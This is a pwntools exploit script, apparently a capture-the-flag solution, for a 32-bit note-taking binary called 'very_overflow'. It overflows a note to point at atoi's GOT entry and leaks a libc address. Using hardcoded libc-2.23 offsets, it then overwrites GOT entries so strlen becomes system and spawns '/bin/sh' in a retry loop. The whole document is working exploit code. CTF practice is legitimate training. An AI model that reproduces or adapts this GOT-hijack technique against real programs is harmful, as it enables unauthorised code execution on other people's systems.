from pwn import *
#context.log_level = 'debug'

def pwn():
	p = process('./very_overflow',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
	#p = remote('hackme.inndy.tw',7705)
	elf = ELF('./very_overflow')

	def add(data):
		p.sendlineafter('action: ','1')
		p.sendlineafter('note: ',data)

	def edit(id,data):
		p.sendlineafter('action: ','2')
		p.sendlineafter('edit: ',str(id))
		p.sendlineafter('data: ',data)

	def show(id):
		p.sendlineafter('action: ','3')
		p.sendlineafter('show: ',str(id))

	def dump():
		p.sendlineafter('action: ','4')

	def exit():
		p.sendlineafter('action: ','5')

	add('aaa\x00')
	add('bbb\x00')
	add('ccc\x00')
	edit(1,'a'*4 + p32(elf.got['atoi']))
	
	#leak libc
	show(3)
	p.recvuntil('note: ')
	atoi_addr = int(p.recvuntil('\n',drop = True),16)
	offset_atoi = 0x0002d230
	offset_system = 0x0003ad80
	offset_printf = 0x00049590
	offset_puts = 0x0005fb80
	offset_fgets = 0x0005e070
	offset_strlen = 0x000754f0
	offset___libc_start_main = 0x00018540
	offset_setvbuf = 0x00060240
	offset_memset = 0x00076f30
	libc_base = atoi_addr - offset_atoi
	log.success('libc base addr : 0x%x'%libc_base)
	system_addr = libc_base + offset_system
	log.success('system addr : 0x%x'%system_addr)
	printf_addr = libc_base + offset_printf
	puts_addr = libc_base + offset_puts
	_dl_runtime_resolve = libc_base + 0x1cf001
	fgets_addr = libc_base + offset_fgets
	strlen_addr = libc_base + offset_strlen
	start_main = libc_base + offset___libc_start_main
	setvbuf_addr = libc_base + offset_setvbuf
	memset_addr = libc_base + offset_memset


	#hijack strlen_got --> system_addr
	edit(1,'a'*4 + p32(0x0804a004) )
	#gdb.attach(p)
	payload = p32(_dl_runtime_resolve) + p32(printf_addr)
	payload += p32(fgets_addr) + p32(puts_addr)
	payload += p32(elf.got['__gmon_start__']) 
	# payload += p32(strlen_addr) + p32(start_main)
	# payload += p32(setvbuf_addr) + p32(memset_addr)
	payload += p32(system_addr)
	add(payload)

	add('/bin/sh\x00')
	#print p.recv()
	p.interactive()
	p.close()

while True:
	try:
		pwn()
	except Exception as e:
		print e
